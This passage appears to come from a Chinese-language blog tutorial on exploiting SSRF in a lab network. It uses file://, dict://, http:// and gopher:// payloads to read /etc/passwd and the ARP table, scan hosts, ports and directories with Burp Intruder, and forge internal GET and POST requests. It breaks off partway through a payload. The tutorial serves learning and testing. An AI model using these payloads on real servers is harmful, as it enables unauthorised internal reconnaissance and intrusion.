<li>对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
<li>攻击运行在内网或本地的应用程序</li>
<li>对内网web应用进行指纹识别，识别企业内部的资产信息</li>
<li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击</li>
</ul>
<h1 id="SSRF学习"><a href="#SSRF学习" class="headerlink" title="SSRF学习"></a>SSRF学习</h1><h2 id="以用SSRF打内网的流程深入学习"><a href="#以用SSRF打内网的流程深入学习" class="headerlink" title="以用SSRF打内网的流程深入学习"></a>以用SSRF打内网的流程深入学习</h2><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><table>
<thead>
<tr>
<th>伪协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>file://</code></td>
<td>从文件系统中获取文件内容，如<code>file:///etc/passwd</code></td>
</tr>
<tr>
<td><code>dict://</code></td>
<td>字典服务协议，访问字典资源，如 <code>dict:///ip:6739/info:</code></td>
</tr>
<tr>
<td><code>ftp://</code></td>
<td>可用于网络端口扫描（效率低一点）</td>
</tr>
<tr>
<td><code>sftp://</code></td>
<td>SSH文件传输协议或安全文件传输协议</td>
</tr>
<tr>
<td><code>ldap://</code></td>
<td>轻量级目录访问协议</td>
</tr>
<tr>
<td><code>tftp://</code></td>
<td>简单文件传输协议</td>
</tr>
<tr>
<td><code>gopher://</code></td>
<td>分布式文档传递服务</td>
</tr>
</tbody></table>
<h3 id="SSRF信息收集–file伪协议–查找内网存活主机"><a href="#SSRF信息收集–file伪协议–查找内网存活主机" class="headerlink" title="SSRF信息收集–file伪协议–查找内网存活主机"></a>SSRF信息收集–<code>file</code>伪协议–查找内网存活主机</h3><p>**作用：**从文件系统中获取文件内容</p>
<p><strong>格式：</strong><code>file://[文件路径]</code></p>
<p><strong>举例：</strong></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>etc/passwd				读取文件passwd</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment">//etc/hosts				显示当前操作系统网卡的IP</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/arp			显示arp缓存表（寻找内网其他主机）</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/fib_trie		显示当前网段路由信息</span><br></code></pre></td></tr></table></figure>

<h4 id="查找内网存活主机"><a href="#查找内网存活主机" class="headerlink" title="查找内网存活主机"></a>查找内网存活主机</h4><p>如下页面，可以使用<code>file://</code>伪协议读取任意文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422214441451.png" srcset="/img/loading.gif" lazyload alt="image-20250422214441451"></p>
<p>可以成功读取到文件，就可以怀疑这个页面存在SSRF漏洞</p>
<p>然后第一个要考虑的就是这台主机所处的内网网段是多少，可以通过使用<code>file://</code>伪协议读取文件进行查看当前这台存在SSRF漏洞的主机的 IP 获取</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215024277.png" srcset="/img/loading.gif" lazyload alt="image-20250422215024277"></p>
<p>可以看到有两个 IP，这表明当前这个服务器存在两个网卡，一个网卡在<code>172.251.251.2</code>这个网段，另一个网卡在<code>172.250.250.2</code>这个网段</p>
<p>然后我们还可以继续获取<code>ARP</code>缓存表，寻找内网其他主机</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/arp<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221329788.png" srcset="/img/loading.gif" lazyload alt="image-20250422221329788"></p>
<p>只读到了三个网站，但是这不代表是所有的主机，只是当前已经使用<code>ARP</code>协议缓存过的</p>
<p>可以使用<code>ARP</code>协议扫描内网，好处是不关心对方服务器开没开防火墙或开了什么策略，只要是工作在 IP 协议的一个服务器，都可以使用<code>ARP</code>协议扫描出来</p>
<p>**什么是<code>ARP</code>缓存表：**ARP 缓存表是主机用于缓存 IP 地址与 MAC 地址映射关系的表，只有与其进行通信才会有这个<code>ARP</code>表</p>
<p><strong>所以可以通过SSRF漏洞去访问内网里的所有 IP，如果主机存活就会被记录在<code>ARP</code>缓存表中，然后使用<code>file://</code>伪协议去读取<code>/proc/net/arp</code>就可以知道有哪些主机是存活的</strong></p>
<p>如：通过SSRF漏洞去访问<code>http://172.250.250.6/</code>这个网段，当前的SSRF服务器就会去尝试访问这个网站，与其进行通信，但是在与其进行通信之前，这个SSRF服务器会先发送一个 ARP 请求给要访问的网站，然后目标网站不管有没有开防火墙都会有一个简单的应答</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221309490.png" srcset="/img/loading.gif" lazyload alt="image-20250422221309490"></p>
<p>然后再此读取<code>ARP</code>缓存表，就会发现多出了刚才访问的网站</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221423498.png" srcset="/img/loading.gif" lazyload alt="image-20250422221423498"></p>
<p>要人工去一个个访问网站太麻烦，可以使用<code>BurpSuite</code>去访问所有地址</p>
<p>首先使用bp进行一次抓包</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222040263.png" srcset="/img/loading.gif" lazyload alt="image-20250422222040263"></p>
<p>将抓到的请求包发送到</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222305099.png" srcset="/img/loading.gif" lazyload alt="image-20250422222305099"></p>
<p>然后在payload中选择类型为数值，定义好范围是1到254，步长为1</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222452166.png" srcset="/img/loading.gif" lazyload alt="image-20250422222452166"></p>
<p>接着就可以开始攻击了</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222825575.png" srcset="/img/loading.gif" lazyload alt="image-20250422222825575"></p>
<p>最后再去读取<code>ARP</code>缓存表得到扫描的结果</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422223008991.png" srcset="/img/loading.gif" lazyload alt="image-20250422223008991"></p>
<p>会发现有的不存活的主机也在里面，可以根据<code>HW address</code>进行区分，如果这部分不全是00的，就是存活的，如果全是00，就是不存活，为0的意思就是向其发送的 ARP 请求，但是目标主机并没有应答，所以该主机是没有存活的</p>
<h3 id="SSRF信息收集–dict伪协议–查找内网主机开放端口"><a href="#SSRF信息收集–dict伪协议–查找内网主机开放端口" class="headerlink" title="SSRF信息收集–dict伪协议–查找内网主机开放端口"></a>SSRF信息收集–<code>dict</code>伪协议–查找内网主机开放端口</h3><p>**作用：**字典服务协议，访问字典资源，可用于扫描端口、获取内网信息、爆破密码等</p>
<p><strong>格式：</strong><code>dict://[服务器IP]:[端口]/[字典数据库名称:关键字]</code></p>
<p><strong>举例：</strong></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dict:</span>//dict<span class="hljs-meta">.org</span>:<span class="hljs-number">2628</span>/moby-thesaurus:happy<br></code></pre></td></tr></table></figure>

<ul>
<li>**<code>dict.org</code>**是字典服务器的地址</li>
<li>**<code>2628</code>**是端口号</li>
<li>**<code>moby-thesaurus</code>**是字典数据库的名称</li>
<li>**<code>happy</code>**是要查询的关键字</li>
</ul>
<p>可以使用<code>dict://</code>伪协议查找内网主机开放端口，与其相似的是<code>ftp://</code>伪协议，但是<code>ftp://</code>伪协议效率较低，所以最好使用<code>dict://</code>伪协议</p>
<h4 id="查找内网主机开放端口"><a href="#查找内网主机开放端口" class="headerlink" title="查找内网主机开放端口"></a>查找内网主机开放端口</h4><p>如下，仍使用bp抓包，添加端口号</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.1:80</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422225838573.png" srcset="/img/loading.gif" lazyload alt="image-20250422225838573"></p>
<p>发送到<code>Intruder</code>中</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230035341.png" srcset="/img/loading.gif" lazyload alt="image-20250422230035341"></p>
<p>然后是要确定这次的payload由哪些部分组成</p>
<ul>
<li>首先是 IP 地址，在前面已经使用<code>file://</code>伪协议获取了存活的主机的 IP 地址，就不用考虑有哪些主机是存活的</li>
<li>第二个就是端口，这次就是测试有哪些端口开放</li>
</ul>
<p>先使用<code>ftp://</code>伪协议进行扫描1到14的IP的80端口</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230503939.png" srcset="/img/loading.gif" lazyload alt="image-20250422230503939"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230527664.png" srcset="/img/loading.gif" lazyload alt="image-20250422230527664"></p>
<p>开始攻击后首先就会发现所需的时间很长，所以不建议使用，可以打开列中的接收到响应和响应完成两个选项判断是否开启了80端口，响应长的都是开启了的</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230933913.png" srcset="/img/loading.gif" lazyload alt="image-20250422230933913"></p>
<p>接下来使用<code>dict://</code>伪协议扫描1到14主机，并且检测端口，这里就要选择攻击类型为集束炸弹</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231338387.png" srcset="/img/loading.gif" lazyload alt="image-20250422231338387"></p>
<p>第一个payload和前面一样是1到14</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231452206.png" srcset="/img/loading.gif" lazyload alt="image-20250422231452206"></p>
<p>第二个payload选择简单列表，并添加一些端口</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231616457.png" srcset="/img/loading.gif" lazyload alt="image-20250422231616457"></p>
<p>经过上面的设置就可以扫描1到14这些主机的我们设置好要扫描的端口</p>
<p>开始攻击，会发现比使用<code>ftp://</code>伪协议快得多</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231900372.png" srcset="/img/loading.gif" lazyload alt="image-20250422231900372"></p>
<p>可以通过长度列的数值辨别该主机的端口是否开放，那些数值大的就是开放了的，下面这些就是没有开放，可以看到数值有明显的分界线</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232121601.png" srcset="/img/loading.gif" lazyload alt="image-20250422232121601"></p>
<h4 id="获取网站信息"><a href="#获取网站信息" class="headerlink" title="获取网站信息"></a>获取网站信息</h4><p>后面加入关键字就可以获取网站的信息了，如<code>info</code></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.11:3306/info</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232905611.png" srcset="/img/loading.gif" lazyload alt="image-20250422232905611"></p>
<h3 id="SSRF信息收集–http伪协议–目录扫描"><a href="#SSRF信息收集–http伪协议–目录扫描" class="headerlink" title="SSRF信息收集–http伪协议–目录扫描"></a>SSRF信息收集–<code>http</code>伪协议–目录扫描</h3><p>**作用：**常规 URL 形式，允许通过 HTTP 1.0 的GET方法，以只读访问文件或资源，在CTF中通常用于远程包含</p>
<p><strong>举例：</strong></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//user:password@example.com</span><br></code></pre></td></tr></table></figure>

<p>在SSRF中就是利用http伪协议进行<strong>目录扫描</strong></p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>接下来对<code>172.250.250.4</code>的<code>80</code>端口进行目录扫描，查看有哪些页面</p>
<p>首先通过SSRF服务器，使用http伪协议访问这个网站</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233710257.png" srcset="/img/loading.gif" lazyload alt="image-20250422233710257"></p>
<p>依旧使用bp抓包，并放到<code>Intruder</code>中</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233849976.png" srcset="/img/loading.gif" lazyload alt="image-20250422233849976"></p>
<p>构造出子页面</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234006520.png" srcset="/img/loading.gif" lazyload alt="image-20250422234006520"></p>
<p>这里做目录扫描就是将<code>index</code>替换成其他的常见的名词</p>
<p>payload选择简单列表，这里要加载字典进去，字典可以在kali中获取，文件路径如下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234630012.png" srcset="/img/loading.gif" lazyload alt="image-20250422234630012"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234952423.png" srcset="/img/loading.gif" lazyload alt="image-20250422234952423"></p>
<p>然后开始攻击，依旧是根据长度判断目录是否存在</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422235918303.png" srcset="/img/loading.gif" lazyload alt="image-20250422235918303"></p>
<p>可以访问看看</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/phpinfo.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001106200.png" srcset="/img/loading.gif" lazyload alt="image-20250423001106200"></p>
<p>如果不确定后缀名，可以再添加一个payload</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001227898.png" srcset="/img/loading.gif" lazyload alt="image-20250423001227898"></p>
<h2 id="SSRF利用–gopher伪协议学习"><a href="#SSRF利用–gopher伪协议学习" class="headerlink" title="SSRF利用–gopher伪协议学习"></a>SSRF利用–gopher伪协议学习</h2><p><code>gopher://</code>伪协议可以理解为<code>http://</code>伪协议的前身</p>
<p><strong>利用范围：</strong><code>GET提交</code>、<code>POST提交</code>、<code>Redis</code>、<code>Fastcgi</code>、<code>SQL</code></p>
<p><strong>为什么使用<code>gopher</code>伪协议：</strong></p>
<ul>
<li>当需要POST提交时，可以利用<code>gopher</code>伪协议进行POST提交</li>
<li><code>gopher</code>伪协议还可以对MySQL数据库发起一个未授权认证的攻击时，提交TCP的数据流</li>
</ul>
<p><strong>格式：</strong><code>URL:gopger://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p>
<p>web也需要加端口号80，<code>gopher</code>协议默认端口为70</p>
<h3 id="gopher请求不转发第一个字符"><a href="#gopher请求不转发第一个字符" class="headerlink" title="gopher请求不转发第一个字符"></a><code>gopher</code>请求不转发第一个字符</h3><p>开启两个kali交互页面，用其中一个向本地的7777端口发送<code>gopher</code>伪协议请求</p>
<p>第一个页面监听7777端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003443809.png" srcset="/img/loading.gif" lazyload alt="image-20250423003443809"></p>
<p>另一个页面发送请求</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/abcd</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003424298.png" srcset="/img/loading.gif" lazyload alt="image-20250423003424298"></p>
<p>会发现发送的是<code>abcd</code>，但接收到的只有<code>bcd</code></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003533987.png" srcset="/img/loading.gif" lazyload alt="image-20250423003533987"></p>
<p><code>gopher</code>请求不转发第一个字符</p>
<p>所以在提交的时候要在前面加上一个填充位<code>_</code>，这个填充位是没有意义的，只是为了让对方受到的数据完整</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/_abcd</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004628798.png" srcset="/img/loading.gif" lazyload alt="image-20250423004628798"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004637464.png" srcset="/img/loading.gif" lazyload alt="image-20250423004637464"></p>
<p>可以看到接收的数据完整了</p>
<h3 id="简单实验"><a href="#简单实验" class="headerlink" title="简单实验"></a>简单实验</h3><p>在SSRF服务器访问如下页面</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004946693.png" srcset="/img/loading.gif" lazyload alt="image-20250423004946693"></p>
<p>这个代码是会将GET或POST提交的值回显出来</p>
<p>首先使用GET提交</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php?name=dazhunag</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005131168.png" srcset="/img/loading.gif" lazyload alt="image-20250423005131168"></p>
<p>然后是POST提交，但是使用<code>http</code>伪协议不能进行POST提交，就算改成POST提交，但只是提交给SSRF这个服务器，SSRF服务器是无法再POST提交给内网主机的</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005305165.png" srcset="/img/loading.gif" lazyload alt="image-20250423005305165"></p>
<p>这就要使用<code>gopher</code>伪协议了，可以使用<code>gopher</code>伪协议提交给SSRF服务器，SSRF服务器接收到提交的内容后，会进行解析，然后可以根据<code>gopher</code>伪协议里定义好的GET或POST方法去决定使用什么方法将数据发送给内网主机</p>
<h4 id="GET提交"><a href="#GET提交" class="headerlink" title="GET提交"></a>GET提交</h4><p>以下是正常使用GET请求的请求包</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423010222009.png" srcset="/img/loading.gif" lazyload alt="image-20250423010222009"></p>
<p><strong>需要保留头部信息</strong></p>
<ul>
<li><strong>路径：</strong><code>GET /name.php?name=dazhuang HTTP/1.1</code></li>
<li><strong>目标IP地址：</strong><code>Host: 172.250.250.4</code></li>
</ul>
<p><strong>构造POC</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/name.php?name=dazhuang</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure>

<p><strong>注意：<strong>POC的最后是有一个</strong>换行符</strong>的，换行的上面是头部信息，下面是POST请求内容，还要注意添加<strong>端口号（<code>80</code>）<strong>和</strong>填充位（<code>_</code>）</strong></p>
<p>最终的POC</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_GET%<span class="hljs-number">20</span>/name.php%<span class="hljs-number">3</span>fname=dazhuang%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>AHost:%<span class="hljs-number">20172</span>.<span class="hljs-number">250</span>.<span class="hljs-number">250</span>.<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>

<ul>
<li>**<code>%20</code>**是空格</li>
<li>**<code>%3f</code>**是问号<code>?</code></li>
<li>**<code>%0d%0A</code>**是换行符</li>
</ul>
<p>进行提交</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011020182.png" srcset="/img/loading.gif" lazyload alt="image-20250423011020182"></p>
<p>也可以用bp抓包，把构造好的后面的内容放到bp里进行两次URL编码（发送请求时，浏览器会进行一次U人L编码，在将数据发送给SSRF服务器时SSRF服务器会进行一次URL解码，然后SSRF服务器发送给内网主机时内网主机会进行第二次URL解码）</p>
<p>第一次编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011541207.png" srcset="/img/loading.gif" lazyload alt="image-20250423011541207"></p>
<p>第二次编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012316053.png" srcset="/img/loading.gif" lazyload alt="image-20250423012316053"></p>
<p>最终结果</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012342123.png" srcset="/img/loading.gif" lazyload alt="image-20250423012342123"></p>
<h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><ul>
<li>问号需要进行URL编码为<code>%3f</code></li>
<li>回车换行要URL编码为<code>%0d%0a</code></li>
<li>在HTTP包的最后要加上<code>%0d%0a</code>，代表消息结束</li>
<li>URL编码改为大写，冒号注意英文冒号</li>
<li>如果使用bp发包需要进行两次URL编码</li>
<li>GET提交最后需要增加一个换行符</li>
</ul>
<h4 id="POST提交"><a href="#POST提交" class="headerlink" title="POST提交"></a>POST提交</h4><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013351894.png" srcset="/img/loading.gif" lazyload alt="image-20250423013351894"></p>
<p><strong>需要保留头部信息：</strong></p>
<ul>
<li>POST</li>
<li>Host:</li>
<li>Content-Type:</li>
<li>Content-Length:</li>
</ul>
<p><strong>构造POC</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/name.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>13<br><br><span class="language-abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>jianjian</span><br></code></pre></td></tr></table></figure>

<p><strong>注意：</strong><code>Content-Length</code>的值要和实际提交的长度一致，否则你定义的长度多少，最终读取到的就是多少，如：实际是13，定义为11，最终只会读<code>name=jianji</code>，还有就是上传的文件类型也要一致</p>
<p>可以像前面GET一样，进行两次URL编码，也可以直接使用bp的编码工具进行两次编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013736219.png" srcset="/img/loading.gif" lazyload alt="image-20250423013736219"></p>
<p>最终POC</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span 